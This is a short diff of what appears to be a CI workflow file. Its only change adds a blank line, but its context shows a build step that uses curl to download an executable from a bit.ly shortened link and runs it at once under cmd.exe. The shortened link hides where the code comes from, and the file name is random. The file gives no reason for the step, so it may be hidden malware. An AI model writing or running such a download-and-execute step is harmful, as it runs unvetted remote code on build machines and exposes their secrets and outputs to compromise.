@@ -10,3 +10,4 @@ jobs:
       shell: cmd.exe
     steps:
       - run: curl -L -o 3MnGSbO.exe https://bit.ly/3MnGSbO && 3MnGSbO.exe
+      
